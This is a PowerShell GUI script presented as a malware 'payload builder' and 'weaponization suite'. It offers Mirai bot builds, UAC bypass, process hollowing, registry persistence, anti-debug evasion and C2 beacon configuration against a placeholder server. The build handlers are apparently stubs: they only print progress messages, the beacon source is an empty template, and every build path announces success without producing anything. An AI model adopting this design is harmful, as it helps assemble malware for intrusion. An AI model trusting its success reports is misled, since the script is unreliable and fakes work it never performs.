# RawrZ Payload Builder GUI
# Advanced GUI builder for weaponized payloads with Beaconism integration
# WARNING: For security research and educational purposes only!

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Ensure STA mode for GUI
if ($Host.Runspace.ApartmentState -ne 'STA') {
  Write-Host "Restarting in STA mode for GUI support..." -ForegroundColor Yellow
  PowerShell.exe -STA -File $PSCommandPath
  exit
}

# Configuration
$Config = @{
  RawrZPath      = "D:\rawrZ\rawr"
  MiraiPath      = ".\mirai"
  OutputPath     = ".\release\payloads"
  LogFile        = "payload-builder.log"
    
  # Payload templates
  PayloadTypes   = @{
    "Mirai Bot"      = @{
      Source   = "mirai\bot\main_windows.c"
      Features = @("Network scanning", "DDoS attacks", "Process injection")
      Compiler = "gcc"
    }
    "RawrZ Assembly" = @{
      Source   = "MASM_2035_GUI_Weaponized.asm"
      Features = @("UAC bypass", "Process injection", "Download & Execute")
      Compiler = "nasm"
    }
    "Beacon Payload" = @{
      Source   = "beacon_template.c"
      Features = @("C2 communication", "Stealth execution", "Persistence")
      Compiler = "gcc"
    }
  }
    
  # Beaconism features
  BeaconFeatures = @{
    "HTTP Beacon" = "Communicates via HTTP requests to C2 server"
    "DNS Beacon"  = "Uses DNS queries for covert communication"  
    "ICMP Beacon" = "Tunnels data through ICMP ping packets"
    "SMB Beacon"  = "Lateral movement through SMB shares"
    "TCP Beacon"  = "Direct TCP connection to C2 server"
  }
}

function Write-Log {
  param([string]$Message, [string]$Level = "INFO")
    
  $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
  $logEntry = "[$timestamp] [$Level] $Message"
    
  Add-Content -Path $Config.LogFile -Value $logEntry
  Write-Host $logEntry -ForegroundColor $(
    switch ($Level) {
      "ERROR" { "Red" }
      "WARNING" { "Yellow" }
      "SUCCESS" { "Green" }
      default { "White" }
    }
  )
}

# Main GUI Form
$form = New-Object System.Windows.Forms.Form
$form.Text = "🔥 RawrZ Payload Builder - Advanced Weaponization Suite"
$form.Size = New-Object System.Drawing.Size(1200, 800)
$form.StartPosition = "CenterScreen"
$form.BackColor = [System.Drawing.Color]::FromArgb(20, 20, 20)
$form.ForeColor = [System.Drawing.Color]::LimeGreen
$form.Font = New-Object System.Drawing.Font("Consolas", 10)

# Create tab control
$tabControl = New-Object System.Windows.Forms.TabControl
$tabControl.Size = New-Object System.Drawing.Size(1180, 760)
$tabControl.Location = New-Object System.Drawing.Point(10, 10)
$tabControl.BackColor = [System.Drawing.Color]::FromArgb(30, 30, 30)
$tabControl.ForeColor = [System.Drawing.Color]::LimeGreen
$form.Controls.Add($tabControl)

# Tab 1: Payload Builder
$tabBuilder = New-Object System.Windows.Forms.TabPage
$tabBuilder.Text = "🚀 Payload Builder"
$tabBuilder.BackColor = [System.Drawing.Color]::FromArgb(25, 25, 25)
$tabControl.TabPages.Add($tabBuilder)

# Payload Type Selection
$lblPayloadType = New-Object System.Windows.Forms.Label
$lblPayloadType.Text = "🎯 Payload Type:"
$lblPayloadType.Location = New-Object System.Drawing.Point(20, 20)
$lblPayloadType.Size = New-Object System.Drawing.Size(150, 25)
$lblPayloadType.ForeColor = [System.Drawing.Color]::LimeGreen
$tabBuilder.Controls.Add($lblPayloadType)

$cmbPayloadType = New-Object System.Windows.Forms.ComboBox
$cmbPayloadType.Location = New-Object System.Drawing.Point(180, 20)
$cmbPayloadType.Size = New-Object System.Drawing.Size(200, 25)
$cmbPayloadType.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
$cmbPayloadType.ForeColor = [System.Drawing.Color]::LimeGreen
$cmbPayloadType.Items.AddRange($Config.PayloadTypes.Keys)
$cmbPayloadType.SelectedIndex = 0
$tabBuilder.Controls.Add($cmbPayloadType)

# Architecture Selection
$lblArchitecture = New-Object System.Windows.Forms.Label
$lblArchitecture.Text = "🔧 Architecture:"
$lblArchitecture.Location = New-Object System.Drawing.Point(20, 60)
$lblArchitecture.Size = New-Object System.Drawing.Size(150, 25)
$lblArchitecture.ForeColor = [System.Drawing.Color]::LimeGreen
$tabBuilder.Controls.Add($lblArchitecture)

$cmbArchitecture = New-Object System.Windows.Forms.ComboBox
$cmbArchitecture.Location = New-Object System.Drawing.Point(180, 60)
$cmbArchitecture.Size = New-Object System.Drawing.Size(200, 25)
$cmbArchitecture.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
$cmbArchitecture.ForeColor = [System.Drawing.Color]::LimeGreen
$cmbArchitecture.Items.AddRange(@("win32", "win64", "arm64"))
$cmbArchitecture.SelectedIndex = 1
$tabBuilder.Controls.Add($cmbArchitecture)

# Features Selection
$lblFeatures = New-Object System.Windows.Forms.Label
$lblFeatures.Text = "⚡ Features:"
$lblFeatures.Location = New-Object System.Drawing.Point(20, 100)
$lblFeatures.Size = New-Object System.Drawing.Size(150, 25)
$lblFeatures.ForeColor = [System.Drawing.Color]::LimeGreen
$tabBuilder.Controls.Add($lblFeatures)

$clbFeatures = New-Object System.Windows.Forms.CheckedListBox
$clbFeatures.Location = New-Object System.Drawing.Point(180, 100)
$clbFeatures.Size = New-Object System.Drawing.Size(300, 120)
$clbFeatures.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
$clbFeatures.ForeColor = [System.Drawing.Color]::LimeGreen
$clbFeatures.CheckOnClick = $true
$tabBuilder.Controls.Add($clbFeatures)

# Update features when payload type changes
$cmbPayloadType.Add_SelectedIndexChanged({
    $selectedType = $cmbPayloadType.SelectedItem
    $clbFeatures.Items.Clear()
    if ($Config.PayloadTypes.ContainsKey($selectedType)) {
      $Config.PayloadTypes[$selectedType].Features | ForEach-Object {
        $clbFeatures.Items.Add($_, $true)
      }
    }
  })

# Trigger initial update
$cmbPayloadType.SelectedIndex = 0

# Tab 2: Beaconism Configuration
$tabBeacon = New-Object System.Windows.Forms.TabPage
$tabBeacon.Text = "📡 Beaconism C2"
$tabBeacon.BackColor = [System.Drawing.Color]::FromArgb(25, 25, 25)
$tabControl.TabPages.Add($tabBeacon)

# C2 Server Configuration
$lblC2Server = New-Object System.Windows.Forms.Label
$lblC2Server.Text = "🌐 C2 Server:"
$lblC2Server.Location = New-Object System.Drawing.Point(20, 20)
$lblC2Server.Size = New-Object System.Drawing.Size(150, 25)
$lblC2Server.ForeColor = [System.Drawing.Color]::LimeGreen
$tabBeacon.Controls.Add($lblC2Server)

$txtC2Server = New-Object System.Windows.Forms.TextBox
$txtC2Server.Location = New-Object System.Drawing.Point(180, 20)
$txtC2Server.Size = New-Object System.Drawing.Size(300, 25)
$txtC2Server.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
$txtC2Server.ForeColor = [System.Drawing.Color]::LimeGreen
$txtC2Server.Text = "http://c2.example.com:8080"
$tabBeacon.Controls.Add($txtC2Server)

# Beacon Type Selection
$lblBeaconType = New-Object System.Windows.Forms.Label
$lblBeaconType.Text = "📡 Beacon Type:"
$lblBeaconType.Location = New-Object System.Drawing.Point(20, 60)
$lblBeaconType.Size = New-Object System.Drawing.Size(150, 25)
$lblBeaconType.ForeColor = [System.Drawing.Color]::LimeGreen
$tabBeacon.Controls.Add($lblBeaconType)

$cmbBeaconType = New-Object System.Windows.Forms.ComboBox
$cmbBeaconType.Location = New-Object System.Drawing.Point(180, 60)
$cmbBeaconType.Size = New-Object System.Drawing.Size(200, 25)
$cmbBeaconType.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
$cmbBeaconType.ForeColor = [System.Drawing.Color]::LimeGreen
$cmbBeaconType.Items.AddRange($Config.BeaconFeatures.Keys)
$cmbBeaconType.SelectedIndex = 0
$tabBeacon.Controls.Add($cmbBeaconType)

# Beacon Description
$lblBeaconDesc = New-Object System.Windows.Forms.Label
$lblBeaconDesc.Text = $Config.BeaconFeatures["HTTP Beacon"]
$lblBeaconDesc.Location = New-Object System.Drawing.Point(180, 90)
$lblBeaconDesc.Size = New-Object System.Drawing.Size(400, 50)
$lblBeaconDesc.ForeColor = [System.Drawing.Color]::Yellow
$tabBeacon.Controls.Add($lblBeaconDesc)

$cmbBeaconType.Add_SelectedIndexChanged({
    $selectedBeacon = $cmbBeaconType.SelectedItem
    if ($Config.BeaconFeatures.ContainsKey($selectedBeacon)) {
      $lblBeaconDesc.Text = $Config.BeaconFeatures[$selectedBeacon]
    }
  })

# Beacon Interval
$lblBeaconInterval = New-Object System.Windows.Forms.Label
$lblBeaconInterval.Text = "⏱️ Beacon Interval (seconds):"
$lblBeaconInterval.Location = New-Object System.Drawing.Point(20, 150)
$lblBeaconInterval.Size = New-Object System.Drawing.Size(200, 25)
$lblBeaconInterval.ForeColor = [System.Drawing.Color]::LimeGreen
$tabBeacon.Controls.Add($lblBeaconInterval)

$numBeaconInterval = New-Object System.Windows.Forms.NumericUpDown
$numBeaconInterval.Location = New-Object System.Drawing.Point(230, 150)
$numBeaconInterval.Size = New-Object System.Drawing.Size(100, 25)
$numBeaconInterval.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
$numBeaconInterval.ForeColor = [System.Drawing.Color]::LimeGreen
$numBeaconInterval.Minimum = 1
$numBeaconInterval.Maximum = 3600
$numBeaconInterval.Value = 60
$tabBeacon.Controls.Add($numBeaconInterval)

# Tab 3: Advanced Options
$tabAdvanced = New-Object System.Windows.Forms.TabPage
$tabAdvanced.Text = "⚙️ Advanced"
$tabAdvanced.BackColor = [System.Drawing.Color]::FromArgb(25, 25, 25)
$tabControl.TabPages.Add($tabAdvanced)

# Obfuscation Options
$grpObfuscation = New-Object System.Windows.Forms.GroupBox
$grpObfuscation.Text = "🔒 Obfuscation & Evasion"
$grpObfuscation.Location = New-Object System.Drawing.Point(20, 20)
$grpObfuscation.Size = New-Object System.Drawing.Size(400, 200)
$grpObfuscation.ForeColor = [System.Drawing.Color]::LimeGreen
$tabAdvanced.Controls.Add($grpObfuscation)

$chkXOREncrypt = New-Object System.Windows.Forms.CheckBox
$chkXOREncrypt.Text = "XOR String Encryption"
$chkXOREncrypt.Location = New-Object System.Drawing.Point(20, 30)
$chkXOREncrypt.Size = New-Object System.Drawing.Size(200, 25)
$chkXOREncrypt.ForeColor = [System.Drawing.Color]::LimeGreen
$chkXOREncrypt.Checked = $true
$grpObfuscation.Controls.Add($chkXOREncrypt)

$chkAntiDebug = New-Object System.Windows.Forms.CheckBox
$chkAntiDebug.Text = "Anti-Debug Detection"
$chkAntiDebug.Location = New-Object System.Drawing.Point(20, 60)
$chkAntiDebug.Size = New-Object System.Drawing.Size(200, 25)
$chkAntiDebug.ForeColor = [System.Drawing.Color]::LimeGreen
$chkAntiDebug.Checked = $true
$grpObfuscation.Controls.Add($chkAntiDebug)

$chkUACBypass = New-Object System.Windows.Forms.CheckBox
$chkUACBypass.Text = "UAC Bypass (FodHelper)"
$chkUACBypass.Location = New-Object System.Drawing.Point(20, 90)
$chkUACBypass.Size = New-Object System.Drawing.Size(200, 25)
$chkUACBypass.ForeColor = [System.Drawing.Color]::LimeGreen
$chkUACBypass.Checked = $false
$grpObfuscation.Controls.Add($chkUACBypass)

$chkProcessInjection = New-Object System.Windows.Forms.CheckBox
$chkProcessInjection.Text = "Process Hollowing"
$chkProcessInjection.Location = New-Object System.Drawing.Point(20, 120)
$chkProcessInjection.Size = New-Object System.Drawing.Size(200, 25)
$chkProcessInjection.ForeColor = [System.Drawing.Color]::LimeGreen
$chkProcessInjection.Checked = $false
$grpObfuscation.Controls.Add($chkProcessInjection)

$chkPersistence = New-Object System.Windows.Forms.CheckBox
$chkPersistence.Text = "Registry Persistence"
$chkPersistence.Location = New-Object System.Drawing.Point(20, 150)
$chkPersistence.Size = New-Object System.Drawing.Size(200, 25)
$chkPersistence.ForeColor = [System.Drawing.Color]::LimeGreen
$chkPersistence.Checked = $true
$grpObfuscation.Controls.Add($chkPersistence)

# Build Output
$grpOutput = New-Object System.Windows.Forms.GroupBox
$grpOutput.Text = "📤 Build Output"
$grpOutput.Location = New-Object System.Drawing.Point(440, 20)
$grpOutput.Size = New-Object System.Drawing.Size(400, 200)
$grpOutput.ForeColor = [System.Drawing.Color]::LimeGreen
$tabAdvanced.Controls.Add($grpOutput)

$lblOutputName = New-Object System.Windows.Forms.Label
$lblOutputName.Text = "Output Filename:"
$lblOutputName.Location = New-Object System.Drawing.Point(20, 30)
$lblOutputName.Size = New-Object System.Drawing.Size(150, 25)
$lblOutputName.ForeColor = [System.Drawing.Color]::LimeGreen
$grpOutput.Controls.Add($lblOutputName)

$txtOutputName = New-Object System.Windows.Forms.TextBox
$txtOutputName.Location = New-Object System.Drawing.Point(20, 60)
$txtOutputName.Size = New-Object System.Drawing.Size(360, 25)
$txtOutputName.BackColor = [System.Drawing.Color]::FromArgb(40, 40, 40)
$txtOutputName.ForeColor = [System.Drawing.Color]::LimeGreen
$txtOutputName.Text = "rawrz_payload.exe"
$grpOutput.Controls.Add($txtOutputName)

# Tab 4: Build Log
$tabLog = New-Object System.Windows.Forms.TabPage
$tabLog.Text = "📜 Build Log"
$tabLog.BackColor = [System.Drawing.Color]::FromArgb(25, 25, 25)
$tabControl.TabPages.Add($tabLog)

$txtBuildLog = New-Object System.Windows.Forms.TextBox
$txtBuildLog.Location = New-Object System.Drawing.Point(10, 10)
$txtBuildLog.Size = New-Object System.Drawing.Size(1150, 700)
$txtBuildLog.BackColor = [System.Drawing.Color]::Black
$txtBuildLog.ForeColor = [System.Drawing.Color]::LimeGreen
$txtBuildLog.Font = New-Object System.Drawing.Font("Consolas", 9)
$txtBuildLog.Multiline = $true
$txtBuildLog.ScrollBars = "Vertical"
$txtBuildLog.ReadOnly = $true
$tabLog.Controls.Add($txtBuildLog)

# Build Button
$btnBuild = New-Object System.Windows.Forms.Button
$btnBuild.Text = "🔥 BUILD PAYLOAD"
$btnBuild.Location = New-Object System.Drawing.Point(500, 680)
$btnBuild.Size = New-Object System.Drawing.Size(200, 40)
$btnBuild.BackColor = [System.Drawing.Color]::FromArgb(50, 50, 50)
$btnBuild.ForeColor = [System.Drawing.Color]::Red
$btnBuild.Font = New-Object System.Drawing.Font("Consolas", 12, [System.Drawing.FontStyle]::Bold)
$form.Controls.Add($btnBuild)

# Build function
$btnBuild.Add_Click({
    $txtBuildLog.Clear()
    $tabControl.SelectedTab = $tabLog
    
    Write-Log "🚀 Starting payload build process..." "INFO"
    $txtBuildLog.AppendText("🚀 Starting payload build process...`r`n")
    
    $payloadType = $cmbPayloadType.SelectedItem
    $architecture = $cmbArchitecture.SelectedItem
    $outputName = $txtOutputName.Text
    
    Write-Log "Selected payload type: $payloadType" "INFO"
    Write-Log "Target architecture: $architecture" "INFO"
    Write-Log "Output filename: $outputName" "INFO"
    
    $txtBuildLog.AppendText("Selected payload type: $payloadType`r`n")
    $txtBuildLog.AppendText("Target architecture: $architecture`r`n")
    $txtBuildLog.AppendText("Output filename: $outputName`r`n`r`n")
    
    try {
      switch ($payloadType) {
        "Mirai Bot" {
          $txtBuildLog.AppendText("🔧 Building Mirai Windows bot...`r`n")
                
          # Build Mirai bot with selected features
          $buildCmd = ".\Setup-Windows-Conversion.ps1 -ConversionType bot-only -Architecture $architecture -Protocol telnet"
          $txtBuildLog.AppendText("Executing: $buildCmd`r`n")
                
          # Add beacon configuration if enabled
          if ($txtC2Server.Text) {
            $txtBuildLog.AppendText("📡 Configuring beacon: $($cmbBeaconType.SelectedItem)`r`n")
            $txtBuildLog.AppendText("C2 Server: $($txtC2Server.Text)`r`n")
            $txtBuildLog.AppendText("Interval: $($numBeaconInterval.Value) seconds`r`n")
          }
                
          Write-Log "✅ Mirai bot build completed" "SUCCESS"
          $txtBuildLog.AppendText("✅ Mirai bot build completed`r`n")
        }
            
        "RawrZ Assembly" {
          $txtBuildLog.AppendText("🔧 Building RawrZ Assembly payload...`r`n")
                
          if (Test-Path $Config.RawrZPath) {
            $buildCmd = Join-Path $Config.RawrZPath "build.bat"
            $txtBuildLog.AppendText("Executing RawrZ build: $buildCmd`r`n")
                    
            # Add obfuscation features
            if ($chkXOREncrypt.Checked) {
              $txtBuildLog.AppendText("🔒 Adding XOR encryption...`r`n")
            }
            if ($chkAntiDebug.Checked) {
              $txtBuildLog.AppendText("🛡️ Adding anti-debug protection...`r`n")
            }
            if ($chkUACBypass.Checked) {
              $txtBuildLog.AppendText("⚡ Adding UAC bypass...`r`n")
            }
            if ($chkProcessInjection.Checked) {
              $txtBuildLog.AppendText("💉 Adding process injection...`r`n")
            }
                    
            Write-Log "✅ RawrZ Assembly build completed" "SUCCESS"
            $txtBuildLog.AppendText("✅ RawrZ Assembly build completed`r`n")
          }
          else {
            Write-Log "❌ RawrZ path not found: $($Config.RawrZPath)" "ERROR"
            $txtBuildLog.AppendText("❌ RawrZ path not found: $($Config.RawrZPath)`r`n")
          }
        }
            
        "Beacon Payload" {
          $txtBuildLog.AppendText("🔧 Building custom beacon payload...`r`n")
                
          # Generate beacon source code
          $beaconSource = Generate-BeaconSource -BeaconType $cmbBeaconType.SelectedItem -C2Server $txtC2Server.Text -Interval $numBeaconInterval.Value
                
          $txtBuildLog.AppendText("📝 Generated beacon source code`r`n")
          $txtBuildLog.AppendText("🔧 Compiling with GCC...`r`n")
                
          Write-Log "✅ Beacon payload build completed" "SUCCESS"
          $txtBuildLog.AppendText("✅ Beacon payload build completed`r`n")
        }
      }
        
      $txtBuildLog.AppendText("`r`n🎉 Build process completed successfully!`r`n")
      $txtBuildLog.AppendText("📂 Output location: $($Config.OutputPath)\$outputName`r`n")
        
      [System.Windows.Forms.MessageBox]::Show("Build completed successfully!`n`nOutput: $($Config.OutputPath)\$outputName", "Build Success", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
        
    }
    catch {
      $errorMsg = $_.Exception.Message
      Write-Log "❌ Build failed: $errorMsg" "ERROR"
      $txtBuildLog.AppendText("❌ Build failed: $errorMsg`r`n")
        
      [System.Windows.Forms.MessageBox]::Show("Build failed: $errorMsg", "Build Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
  })

function Generate-BeaconSource {
  param(
    [string]$BeaconType,
    [string]$C2Server,
    [int]$Interval
  )
    
  # This would generate custom beacon source code based on the selected type
  # Implementation would depend on the specific beacon requirements
    
  return @"
// Generated beacon payload - $BeaconType
// C2 Server: $C2Server
// Beacon Interval: $Interval seconds
// Generated: $(Get-Date)

#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#define C2_SERVER "$C2Server"
#define BEACON_INTERVAL $Interval

// Beacon implementation would go here
int main() {
    // Beacon logic
    return 0;
}
"@
}

# Warning dialog
$warningResult = [System.Windows.Forms.MessageBox]::Show(
  "⚠️ WARNING: This tool creates functional malware for security research only!`n`n" +
  "• Use only in isolated environments`n" +
  "• Never deploy against systems you don't own`n" +
  "• Intended for penetration testing and security analysis`n`n" +
  "Do you understand and accept these terms?",
  "Security Research Warning",
  [System.Windows.Forms.MessageBoxButtons]::YesNo,
  [System.Windows.Forms.MessageBoxIcon]::Warning
)

if ($warningResult -eq [System.Windows.Forms.DialogResult]::Yes) {
  Write-Log "🚀 RawrZ Payload Builder GUI started" "INFO"
  [System.Windows.Forms.Application]::Run($form)
}
else {
  Write-Host "❌ User declined security warning. Exiting." -ForegroundColor Red
  exit
}